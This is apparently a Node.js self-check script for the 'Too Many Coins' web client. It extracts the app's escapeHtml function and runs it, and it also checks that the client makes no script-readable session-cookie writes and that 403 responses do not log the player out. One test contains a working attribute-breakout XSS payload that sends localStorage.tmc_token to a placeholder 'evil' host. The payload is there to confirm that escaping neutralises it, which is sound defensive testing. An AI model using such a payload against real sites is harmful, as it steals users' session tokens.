#!/usr/bin/env node
/**
 * Too Many Coins - Client Security Self-Check
 *
 * Guards the client-side fixes in public/js/app.js against regression.
 *
 * Unlike a hand-written stub, this extracts the REAL escapeHtml source out of
 * app.js and executes it, so the test cannot silently drift from the shipped
 * implementation.
 *
 * Usage:  node tools/client_security_selfcheck.js
 * Exit:   0 = pass, 1 = fail
 */

const fs = require('fs');
const path = require('path');
const assert = require('assert');

const appPath = path.join(__dirname, '..', 'public', 'js', 'app.js');
const src = fs.readFileSync(appPath, 'utf8');

const failures = [];
function check(name, fn) {
    try {
        fn();
        console.log('  pass  ' + name);
    } catch (err) {
        failures.push({ name, message: err.message });
        console.log('  FAIL  ' + name + '\n          ' + err.message);
    }
}

// ---- extract the real escapeHtml implementation ---------------------------
const match = src.match(/escapeHtml\(str\)\s*\{[\s\S]*?\n    \},/);
if (!match) {
    console.error('Could not locate escapeHtml() in app.js - update this check.');
    process.exit(1);
}
const escapeHtml = new Function(
    'return function ' + match[0].replace(/,$/, '') + ';'
)();

console.log('Client security self-check');
console.log('-'.repeat(60));

// ---- escapeHtml must be safe in ATTRIBUTE context, not just text ----------
// A textContent -> innerHTML round-trip escapes & < > but NOT quotes, so any
// value interpolated into value="..." could break out of the attribute. The
// staff panel renders another player's profile_status exactly that way.
check('escapeHtml escapes double quotes', () => {
    assert.ok(!escapeHtml('a"b').includes('"'), 'raw double quote survived');
});

check('escapeHtml escapes single quotes', () => {
    assert.ok(!escapeHtml("a'b").includes("'"), 'raw single quote survived');
});

check('escapeHtml escapes angle brackets and ampersand', () => {
    const out = escapeHtml('<img>&');
    assert.ok(!out.includes('<') && !out.includes('>'), 'raw angle bracket survived');
    assert.strictEqual(escapeHtml('&').includes('&amp;'), true);
});

check('attribute breakout payload is neutralised', () => {
    // The real-world payload: 76 chars, under the 80-char profile_status limit.
    const payload = '" autofocus onfocus="fetch(\'//evil/\'+localStorage.tmc_token)';
    const rendered = 'value="' + escapeHtml(payload) + '"';
    // After the opening value=" there must be exactly one more unescaped quote:
    // the closing one. Anything else means the attribute was escapable.
    const quoteCount = (rendered.match(/"/g) || []).length;
    assert.strictEqual(quoteCount, 2, 'payload introduced extra unescaped quotes');
    assert.ok(!rendered.includes('onfocus="'), 'injected event handler survived');
});

check('escapeHtml preserves benign text', () => {
    assert.strictEqual(escapeHtml('Hello world 123'), 'Hello world 123');
});

check('escapeHtml falsy handling is unchanged', () => {
    // Deliberately identical to the pre-fix behaviour so the security change did
    // not silently alter rendering anywhere that passes 0/null/undefined.
    assert.strictEqual(escapeHtml(''), '');
    assert.strictEqual(escapeHtml(null), '');
    assert.strictEqual(escapeHtml(undefined), '');
    assert.strictEqual(escapeHtml(0), '');
});

// ---- the client must not strip HttpOnly from the session cookie -----------
check('client never writes the session token to document.cookie', () => {
    const writes = src.match(/document\.cookie\s*=\s*[^;\n]*tmc_session=\$\{[^}]+\}/g) || [];
    assert.strictEqual(
        writes.length, 0,
        'found ' + writes.length + ' client-side session cookie write(s); these replace the ' +
        'server HttpOnly cookie with a script-readable one'
    );
});

// ---- 403 is permission-denied, not a dead session ------------------------
check('403 does not trigger logout', () => {
    const logoutGuard = src.match(/if \(resp\.status === 401[^)]*\)[^{]*\{\s*\n\s*this\.handleLoggedOut\(\);/);
    assert.ok(logoutGuard, 'could not locate the logout guard - update this check');
    assert.ok(
        !/resp\.status === 403/.test(logoutGuard[0]),
        'a 403 (staff/admin permission denied) still force-logs-out the player'
    );
});

console.log('-'.repeat(60));
if (failures.length === 0) {
    console.log('Result: PASS (' + 8 + ' checks)');
    process.exit(0);
}
console.log('Result: FAIL - ' + failures.length + ' check(s) failed');
process.exit(1);
